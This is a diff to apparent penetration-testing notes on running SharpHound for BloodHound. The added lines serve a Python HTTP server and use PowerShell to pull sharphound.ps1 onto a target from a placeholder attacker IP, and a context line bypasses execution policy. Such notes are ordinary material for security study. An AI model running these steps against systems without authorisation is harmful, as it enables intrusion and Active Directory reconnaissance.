@@ -3,6 +3,12 @@ Collects data for Bloodhound to analyse.
 ## Sharphound
 https://github.com/SpecterOps/SharpHound/releases
 ### Step 1: Transfer Sharphound to target
+```bash
+python3 -m http.server
+```
+```powershell
+iwr -uri http://$(IP_ADDRESS)/sharphound.ps1 -OutFile sharphound.ps1
+```
 ### Step 2: Import Sharphound module
 ```powershell
 powershell -ep bypass
